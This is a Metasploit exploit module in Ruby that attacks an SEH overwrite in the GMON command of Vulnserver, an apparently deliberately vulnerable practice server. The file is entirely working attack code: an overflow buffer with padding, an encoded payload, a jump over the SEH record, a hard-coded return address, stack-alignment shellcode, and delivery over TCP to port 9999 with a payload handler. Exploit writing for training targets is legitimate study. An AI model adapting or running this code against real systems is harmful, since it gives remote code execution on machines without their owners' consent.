##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Created as a small experiment in order to play with module creation. This module may not work against an OS that isn't Windows 7, as the registers' values may be different, making the alignment useless.

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  #include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Vulnserver GMON SEH Overwrite',
      'Description'    => %q{
        This module exploits a SEH Overwrite within the Vulnserver software.
      },
      'Author'         =>
        [
          'Felipe Winsnes',
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
           [ 'EDB', '' ],
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Universal', { 'Ret' => 0x6250172B } ],
        ],
      'DefaultOptions' => {
          'RPORT' => 9999,
          'EXITFUNC' => 'thread',
          'ENCODER' => 'x86/alpha_mixed',
          'BufferRegister' => 'EAX',
        },
      'DefaultTarget'  => 0))
  end

  def align_n_jmp
    align = "\x54\x58" # PUSH ESP, POP EAX
    align << "\x66\x05\x34\x0D" # nasm > add ax, 0xd34
    align << "\xFF\xE0" # JMP EAX
end 

  def exploit
    sploit = "GMON /.:/"
    sploit << "A" * 1999
    sploit << payload.encoded 
    sploit << "A" * (3515 - 1999 - payload.encoded.length)
    sploit << "\x70\x08\x71\x06"
    sploit << [target.ret].pack('V') + "\x41\x49" * 5
    sploit << align_n_jmp
    sploit << "\xff" * 20000

    connect
    sock.put(sploit)
    handler
    disconnect
  end
end
